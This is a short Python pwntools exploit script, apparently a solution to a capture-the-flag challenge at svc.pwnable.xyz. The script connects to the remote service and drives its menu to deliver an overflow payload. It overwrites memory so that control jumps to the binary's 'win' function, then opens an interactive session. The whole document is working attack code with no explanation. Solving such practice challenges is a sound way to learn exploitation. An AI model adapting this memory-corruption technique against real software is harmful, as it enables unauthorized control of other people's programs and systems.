from pwn import *
#p = process("./challenge")

p = remote("svc.pwnable.xyz", 30013)
elf = ELF("./challenge")
win = elf.symbols['win']
def concat(name):
	p.sendlineafter(".", "1")
	p.sendafter("Name: ",name)

if __name__ == "__main__":
	payload = "a"*0x80 + "\x40\x20\x60\x12"
	length = len(payload)
	p.send("A")
	p.send("bbbb")
	
	for i in range(length - 128):
		concat("\x00")
	concat(payload)

	p.sendlineafter(".", "2")
	p.sendafter("Desc: ", p64(elf.symbols['win']))
	p.interactive()
